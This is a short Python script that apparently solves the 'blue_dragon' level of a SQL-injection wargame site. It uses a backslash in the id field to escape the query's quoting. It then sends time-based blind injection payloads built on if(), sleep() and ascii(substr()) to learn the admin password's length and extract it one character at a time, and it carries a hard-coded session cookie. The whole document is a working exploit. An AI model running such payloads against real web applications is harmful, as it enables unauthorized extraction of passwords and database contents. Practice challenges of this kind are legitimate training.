import string
import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
params = {"id" : None,"pw" : None}
cookies ={"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}

params['id'] = "\\"

for i in range(30):
    payload = "|| id='admin' and if(length(pw)={},sleep(3),0)#".format(i)
    params["pw"] = payload
    print(params)
    start_time = time.time()
    response = requests.get(url,params=params,cookies=cookies)
    end_time = time.time()
    if( (end_time - start_time) >3):
        print("find the pw_length",i)
        break
# 비밀번호 길이 8
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload="|| id='admin' and if(ascii(substr(pw,{},1))={},sleep(3),0)#".format(i,ord(j))
        params["pw"] = payload
        print(payload)
        start_time = time.time()
        response = requests.get(url,params=params,cookies=cookies)
        end_time = time.time()
        if( end_time - start_time >3 ):
            flag += j
            print("find the flag",flag)
            break

